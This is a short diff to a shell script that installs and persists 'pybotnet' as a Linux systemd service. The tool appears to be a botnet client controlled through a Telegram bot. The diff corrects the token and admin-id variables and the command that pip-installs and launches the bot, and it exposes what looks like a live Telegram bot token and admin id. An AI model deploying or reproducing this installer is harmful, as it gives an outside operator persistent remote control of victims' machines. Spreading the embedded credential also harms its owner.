@@ -2,8 +2,8 @@
 
 ## add pybotnet to linux systemd service ##
 
-# (step 0) replace youre telegram_bt_token, admin_id and botnet_id with your own:
-telegram_bt_token=50882347232:AAFdKuWopE9Mg-5Mj1WURfuu90cBGYaSAC
+# (step 0) replace youre telegram_bot_token, admin_id and botnet_id with your own:
+telegram_bot_token=50882347232:AAFdKuWopE9Mg-5Mj1WURfuu90cBGYaSAC
 admin_id=7903674345
 bot_name=linux_service_bot_1
 
@@ -36,4 +36,4 @@ apt install python3-dev
 pip3 install pybotnet -U --pre
 
 echo "$(date) start pybotnet" >> /tmp/pybotnet.log
-python3 -m pybotnet $token $id $bot_name
+python3 -m pybotnet $telegram_bot_token $admin_id $bot_name
